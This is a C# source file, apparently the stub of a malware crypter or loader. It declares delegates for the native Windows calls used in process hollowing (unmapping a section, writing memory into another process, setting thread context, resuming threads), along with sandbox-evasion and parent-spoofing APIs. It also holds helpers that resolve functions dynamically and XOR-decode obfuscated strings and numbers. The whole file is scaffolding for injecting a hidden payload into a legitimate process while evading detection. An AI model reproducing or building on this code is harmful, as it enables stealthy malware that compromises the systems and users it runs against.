using System;
using System.Linq;
using System.Runtime.InteropServices;

public partial class __Stub
{
	/// <summary>
	/// delegate uint SetErrorModeDelegate(uint mode)
	/// </summary>
	public delegate uint __SetErrorModeDelegate(uint __mode);
	/// <summary>
	/// delegate int SHGetKnownFolderPath(Guid rfid, uint flags, IntPtr token, out string path)
	/// </summary>
	public delegate int __SHGetKnownFolderPathDelegate([MarshalAs(UnmanagedType.LPStruct)] Guid __rfid, uint __flags, IntPtr __token, [MarshalAs(UnmanagedType.LPWStr)] out string __path);
	/// <summary>
	/// delegate IntPtr VirtualAllocExNumaDelegate(IntPtr process, IntPtr address, uint size, uint allocationType, uint protect, uint preferred)
	/// </summary>
	public delegate IntPtr __VirtualAllocExNumaDelegate(IntPtr __process, IntPtr __address, uint __size, uint __allocationType, uint __protect, uint __preferred);
	/// <summary>
	/// delegate bool Wow64DisableWow64FsRedirectionDelegate(ref IntPtr ptr)
	/// </summary>
	public delegate bool __Wow64DisableWow64FsRedirectionDelegate(ref IntPtr ptr);
	/// <summary>
	/// delegate IntPtr OpenProcessDelegate(int access, bool inheritHandle, int processId)
	/// </summary>
	public delegate IntPtr __OpenProcessDelegate(int __access, bool __inheritHandle, int __processId);
	/// <summary>
	/// delegate bool CreateProcessDelegate(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation)
	/// </summary>
	public delegate bool __CreateProcessDelegate([MarshalAs(UnmanagedType.LPWStr)] string __applicationName, [MarshalAs(UnmanagedType.LPWStr)] string __commandLine, IntPtr __processAttributes, IntPtr __threadAttributes, bool __inheritHandles, uint __creationFlags, IntPtr __environment, string __currentDirectory, IntPtr __startupInfo, byte[] __processInformation);
	/// <summary>
	/// delegate uint GetLastErrorDelegate()
	/// </summary>
	public delegate uint __GetLastErrorDelegate();
	/// <summary>
	/// delegate int NtQueryInformationProcessDelegate(IntPtr process, int processInformationClass, IntPtr processInformation, uint processInformationLength, IntPtr returnLength)
	/// </summary>
	public delegate int __NtQueryInformationProcessDelegate(IntPtr __process, int __processInformationClass, IntPtr __processInformation, uint __processInformationLength, IntPtr __returnLength);
	/// <summary>
	/// delegate int NtAllocateVirtualMemoryDelegate(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint allocationType, uint protect)
	/// </summary>
	public delegate int __NtAllocateVirtualMemoryDelegate(IntPtr __process, ref IntPtr __address, IntPtr __zeroBits, ref IntPtr __size, uint __allocationType, uint __protect);
	/// <summary>
	/// delegate int NtWriteVirtualMemoryDelegate(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten)
	/// </summary>
	public delegate int __NtWriteVirtualMemoryDelegate(IntPtr __process, IntPtr __baseAddress, byte[] __buffer, int __size, IntPtr __bytesWritten);
	/// <summary>
	/// delegate uint NtUnmapViewOfSectionDelegate(IntPtr process, IntPtr baseAddress)
	/// </summary>
	public delegate uint __NtUnmapViewOfSectionDelegate(IntPtr __process, IntPtr __baseAddress);
	/// <summary>
	/// delegate int NtSetContextThreadDelegate(IntPtr thread, IntPtr context)
	/// </summary>
	public delegate int __NtSetContextThreadDelegate(IntPtr __thread, IntPtr __context);
	/// <summary>
	/// delegate int NtGetContextThreadDelegate(IntPtr thread, IntPtr context)
	/// </summary>
	public delegate int __NtGetContextThreadDelegate(IntPtr __thread, IntPtr __context);
	/// <summary>
	/// delegate int NtResumeThreadDelegate(IntPtr thread, out uint suspendCount)
	/// </summary>
	public delegate int __NtResumeThreadDelegate(IntPtr __thread, out uint __suspendCount);
	/// <summary>
	/// delegate bool InitializeProcThreadAttributeListDelegate(IntPtr attributeList, int attributeCount, int flags, ref IntPtr size)
	/// </summary>
	public delegate bool __InitializeProcThreadAttributeListDelegate(IntPtr __attributeList, int __attributeCount, int __flags, ref IntPtr __size);
	/// <summary>
	/// delegate bool UpdateProcThreadAttributeDelegate(IntPtr attributeList, uint flags, IntPtr attribute, IntPtr value, IntPtr size, IntPtr previousValue, IntPtr returnSize)
	/// </summary>
	public delegate bool __UpdateProcThreadAttributeDelegate(IntPtr __attributeList, uint __flags, IntPtr __attribute, IntPtr __value, IntPtr __size, IntPtr __previousValue, IntPtr __returnSize);

	/// <summary>
	/// TDelegate GetFunction<TDelegate>(string dll, string name)
	/// </summary>
	public static __TDelegate __GetFunction<__TDelegate>(string __dll, string __name)
	{
		// Get function pointer from DLL by name and return as delegate
		return Marshal.GetDelegateForFunctionPointer<__TDelegate>(__GetProcAddress(__LoadLibraryA(ref __dll), ref __name));
	}
	/// <summary>
	/// string DecryptString(params ushort[] str)
	/// </summary>
	public static string __DecryptString(params ushort[] __str)
	{
		// Decrypt string
		return new string(__str.Skip(/**/1).Select(b => (char)(b ^ __str[/**/0])).ToArray());
	}
	/// <summary>
	/// int DecryptInt32(int value, int key)
	/// </summary>
	public static int __DecryptInt32(int __value, int __key)
	{
		return __value ^ (__key ^ 0x3d69c853);
	}

	[DllImport("kernel32.dll", EntryPoint = "LoadLibraryA", SetLastError = true)]
	private static extern IntPtr __LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string __name);
	[DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
	private static extern IntPtr __GetProcAddress(IntPtr __process, [MarshalAs(UnmanagedType.VBByRefStr)] ref string __name);
}